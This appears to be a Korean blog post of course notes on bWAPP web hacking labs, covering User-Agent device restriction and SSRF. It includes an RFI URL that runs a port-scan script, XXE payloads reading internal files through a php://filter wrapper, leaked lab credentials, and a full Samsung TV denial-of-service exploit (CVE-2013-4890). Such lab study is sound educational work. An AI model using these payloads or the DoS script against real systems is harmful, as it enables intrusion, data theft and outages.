---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - 디바이스 접근 제한/서버 측 요청변조"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part7 A7
  - 기능 수준의 접근 통제 누락
---

<!--more-->

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 21강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

## 디바이스 접근 제한

![image](https://user-images.githubusercontent.com/28076542/52859168-5cd36700-316f-11e9-96f5-f1120745bd48.png)

* 안드로이드와 파이어폭스는 각각 보는 페이지가 다름

---

## Restrict Device Access

![image](https://user-images.githubusercontent.com/28076542/52859359-d4a19180-316f-11e9-9a81-d1d7b14aa1cb.png)

### User-Agent Switcher로 안드로이드 폰으로 설정하였을 때

![image](https://user-images.githubusercontent.com/28076542/52859421-06b2f380-3170-11e9-93eb-c88822015b35.png)

* [User-Agent Switcher는 여기서 한 번 다룸](https://leeminki.github.io/webhack/2019/02/10/WebHack_Study_12.html)

### restrict_device_access.php

```php
function check_user_agent()
{

    $user_agent = $_SERVER["HTTP_USER_AGENT"];

    // Debugging
    // echo $user_agent;

    $authorized_device = false;

    $devices = array("iPhone", "iPad", "iPod", "Android");

    // Searches for a string in an array
    foreach($devices as $str)
    {

        // echo $str;
        if(strpos($user_agent, $str) !== false) 
        {

            // Debugging    
            // echo $user_agent . " contains the word " . $str;

            $authorized_device = true;
        }

    }
    return $authorized_device;
}
```

---

## SSRF(Server Side Request Forgery, 서버측 요청 변조)

* 공격자가 요쳥을 변조하여 취약한 서버가 내부 망에 악의적인 요청을 보내게 하는 취약점

### SSRF 유형

1. RFI를 사용하여 포트 스캔
2. XXE(XML External Entity)를 사용하여 내부 망 자원에 접근
3. XXE를 통하여 삼성 스마트 TV (CVE-2013-4890)

---

## Server Side Request Forgery (SSRF)

![image](https://user-images.githubusercontent.com/28076542/52859857-344c6c80-3171-11e9-8d35-82730d452426.png)

```bash
bee@bee-box:/var/www/evil$ ls -l ssrf*
-rw-rw-r-- 1 root www-data 1384 2014-11-02 23:52 ssrf-1.txt
-rw-rw-r-- 1 root www-data  681 2014-11-02 23:52 ssrf-2.txt
-rw-rw-r-- 1 root www-data 1031 2014-11-02 23:52 ssrf-3.txt
```

* 위 세 파일을 다 열어볼 것

### ssrf-1.txt

```php
if($pf = @fsockopen($_REQUEST["ip"], $port, $err, $err_string, 1))
        {
            $results[$port] = true;
            fclose($pf);
        }
```

* **fsockopen**은 소켓이 열려있는지 안 열려있는지 확인하는 PHP 함수
* [fsockopen 자세한 내용](http://php.net/manual/en/function.fsockopen.php)

### Remote & Local File Inclusion (RFL/LFI) URL을 이용하여 ssrf-1.txt 실행

![image](https://user-images.githubusercontent.com/28076542/52860186-13d0e200-3172-11e9-9227-27345ff9ef6a.png)

![image](https://user-images.githubusercontent.com/28076542/52860284-54306000-3172-11e9-95a4-bc77639326da.png)

* URL: `https://192.168.190.143:8443/bWAPP/rlfi.php?language=http://192.168.190.143/evil/ssrf-1.txt&action=go&ip=127.0.0.1`

### ssrf-2.txt

```xml
# Accesses a file on the internal network (1)

<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE root [

 <!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt">

]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>


# Accesses a file on the internal network (2)

# Web pages returns some characters that break the XML schema > use the PHP base64 encoder filter to return an XML schema friendly version of the page!

<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE root [

 <!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml">

]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>
```

* XML을 보면 두 개의 항목으로 나뉘어져 있음

### 1. SQL Injection - Stored (XML)에서 BurpSuite로 프록시 잡고 Send to Repeater 설정

![image](https://user-images.githubusercontent.com/28076542/52860426-c608a980-3172-11e9-8a63-176ccbd34824.png)

### 2. Repeater 탭 항목 이동 후 ssrf-2.txt의 XML에서 첫 번째 항목을 Body에 넣고 Go 버튼 클릭

```xml
<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE root [

 <!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt">

]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>
```

![image](https://user-images.githubusercontent.com/28076542/52860623-44654b80-3173-11e9-9401-339b377db1b9.png)

* robots.txt를 출력하게 하는 내용이었음

### 3. 이번엔 ssrf-2.txt의 XML에서 두 번째 항목을 Body에 넣고 Go 버튼 클릭

```xml
<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE root [

 <!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml">

]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>
```

![image](https://user-images.githubusercontent.com/28076542/52860692-855d6000-3173-11e9-8536-4f7d23ad4474.png)

```bash
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPGhlcm9lcz4KCTxoZXJvPgoJCTxpZD4xPC9pZD4KCQk8bG9naW4+bmVvPC9sb2dpbj4KCQk8cGFzc3dvcmQ+dHJpbml0eTwvcGFzc3dvcmQ+CgkJPHNlY3JldD5PaCB3aHkgZGlkbid0IEkgdG9vayB0aGF0IEJMQUNLIHBpbGw/PC9zZWNyZXQ+CgkJPG1vdmllPlRoZSBNYXRyaXg8L21vdmllPgoJCTxnZW5yZT5hY3Rpb24gc2NpLWZpPC9nZW5yZT4KCTwvaGVybz4KCTxoZXJvPgoJCTxpZD4yPC9pZD4KCQk8bG9naW4+YWxpY2U8L2xvZ2luPgoJCTxwYXNzd29yZD5sb3ZlWm9tYmllczwvcGFzc3dvcmQ+CgkJPHNlY3JldD5UaGVyZSdzIGEgY3VyZSE8L3NlY3JldD4KCQk8bW92aWU+UmVzaWRlbnQgRXZpbDwvbW92aWU+CgkJPGdlbnJlPmFjdGlvbiBob3Jyb3Igc2NpLWZpPC9nZW5yZT4KCTwvaGVybz4KCTxoZXJvPgoJCTxpZD4zPC9pZD4KCQk8bG9naW4+dGhvcjwvbG9naW4+CgkJPHBhc3N3b3JkPkFzZ2FyZDwvcGFzc3dvcmQ+CgkJPHNlY3JldD5PaCwgbm8uLi4gdGhpcyBpcyBFYXJ0aC4uLiBpc24ndCBpdD88L3NlY3JldD4KCQk8bW92aWU+VGhvcjwvbW92aWU+CgkJPGdlbnJlPmFjdGlvbiBzY2ktZmk8L2dlbnJlPgoJPC9oZXJvPgoJPGhlcm8+CgkJPGlkPjQ8L2lkPgoJCTxsb2dpbj53b2x2ZXJpbmU8L2xvZ2luPgoJCTxwYXNzd29yZD5Mb2dATjwvcGFzc3dvcmQ+CgkJPHNlY3JldD5XaGF0J3MgYSBNYWduZXRvPzwvc2VjcmV0PgoJCTxtb3ZpZT5YLU1lbjwvbW92aWU+CgkJPGdlbnJlPmFjdGlvbiBzY2ktZmk8L2dlbnJlPgoJPC9oZXJvPgoJPGhlcm8+CgkJPGlkPjU8L2lkPgoJCTxsb2dpbj5qb2hubnk8L2xvZ2luPgoJCTxwYXNzd29yZD5tM3BoMXN0MHBoM2wzczwvcGFzc3dvcmQ+CgkJPHNlY3JldD5JJ20gdGhlIEdob3N0IFJpZGVyITwvc2VjcmV0PgoJCTxtb3ZpZT5HaG9zdCBSaWRlcjwvbW92aWU+CgkJPGdlbnJlPmFjdGlvbiBzY2ktZmk8L2dlbnJlPgoJPC9oZXJvPgoJPGhlcm8+CgkJPGlkPjY8L2lkPgoJCTxsb2dpbj5zZWxlbmU8L2xvZ2luPgoJCTxwYXNzd29yZD5tMDBuPC9wYXNzd29yZD4KCQk8c2VjcmV0Pkl0IHdhc24ndCB0aGUgTHljYW5zLiBJdCB3YXMgeW91Ljwvc2VjcmV0PgoJCTxtb3ZpZT5VbmRlcndvcmxkPC9tb3ZpZT4KCQk8Z2VucmU+YWN0aW9uIGhvcnJvciBzY2ktZmk8L2dlbnJlPgoJPC9oZXJvPgo8L2hlcm9lcz4=
```

* Base64 인코딩 내용이 나옴

### 4. Base64 디코드 하기

```xml
<?xml version="1.0" encoding="UTF-8"?>
<heroes>
	<hero>
		<id>1</id>
		<login>neo</login>
		<password>trinity</password>
		<secret>Oh why didn't I took that BLACK pill?</secret>
		<movie>The Matrix</movie>
		<genre>action sci-fi</genre>
	</hero>
	<hero>
		<id>2</id>
		<login>alice</login>
		<password>loveZombies</password>
		<secret>There's a cure!</secret>
		<movie>Resident Evil</movie>
		<genre>action horror sci-fi</genre>
	</hero>
	<hero>
		<id>3</id>
		<login>thor</login>
		<password>Asgard</password>
		<secret>Oh, no... this is Earth... isn't it?</secret>
		<movie>Thor</movie>
		<genre>action sci-fi</genre>
	</hero>
	<hero>
		<id>4</id>
		<login>wolverine</login>
		<password>Log@N</password>
		<secret>What's a Magneto?</secret>
		<movie>X-Men</movie>
		<genre>action sci-fi</genre>
	</hero>
	<hero>
		<id>5</id>
		<login>johnny</login>
		<password>m3ph1st0ph3l3s</password>
		<secret>I'm the Ghost Rider!</secret>
		<movie>Ghost Rider</movie>
		<genre>action sci-fi</genre>
	</hero>
	<hero>
		<id>6</id>
		<login>selene</login>
		<password>m00n</password>
		<secret>It wasn't the Lycans. It was you.</secret>
		<movie>Underworld</movie>
		<genre>action horror sci-fi</genre>
	</hero>
</heroes>
```

* [Base64 디코드 사이트](https://www.base64decode.org/)
* 서버가 txt를 받고 PHP로 읽어 포트 스캔이 첫 번째 케이스
* XXE(XML External Entity)를 사용하여 내부 망 자원을 접근한게 두 번째 케이스
* 이제 세 번째 케이스인 삼성 스마트 TV (CVE-2013-4890)을 살펴봄

### XXE를 통하여 삼성 스마트 TV (CVE-2013-4890)

```python
#!/usr/bin/python

# Exploit Title: Samsung TV Denial of Service (DoS) Attack
# Date: 07/21/2013
# Exploit Author: Malik Mesellem - @MME_IT - http://www.itsecgames.com
# CVE Number: CVE-2013-4890
# Vendor Homepage: http://www.samsung.com
# Description: Resets some Samsung TVs
#   The web server (DMCRUIS/0.1) on port TCP/5600 is crashing by sending a long HTTP GET request
#   Tested successfully on my Samsung PS50C7700 plasma TV :)
 
import httplib
import sys
import os

print "  ***************************************************************************************"
print "   Author: Malik Mesellem - @MME_IT - http://www.itsecgames.com\n"
print "   Exploit: Denial of Service (DoS) attack\n"
print "   Description: Resets some Samsung TVs\n"
print "     The web server (DMCRUIS/0.1) on port TCP/5600 is crashing by sending a long request."
print "     Tested successfully on my Samsung PS50C7700 plasma TV :)\n"
print "  ***************************************************************************************\n"

# Sends the payload
print "  Sending the malicious payload...\n"
conn = httplib.HTTPConnection(sys.argv[1],5600)
conn.request("GET", "A"*300)
conn.close()

# Checks the response
print "  Checking the status... (CTRL+Z to stop)\n"
response = 0
while response == 0:
  response = os.system("ping -c 1 " + sys.argv[1] + "> /dev/null 2>&1")
  if response != 0:
    print "  Target down!\n"
```

* 요청에 A를 300번 넣으면 예외처리가 되지 않아 프로세스가 죽음
* 프로세스가 죽고나서 ping을 보내 서비스가 살아있는지 확인 후 대답이 없으면 Target down!을 출력하게 하는 버퍼 오버플로 취약점
* [Samsung PS50C7700 TV - Denial of Service](https://www.exploit-db.com/exploits/27043)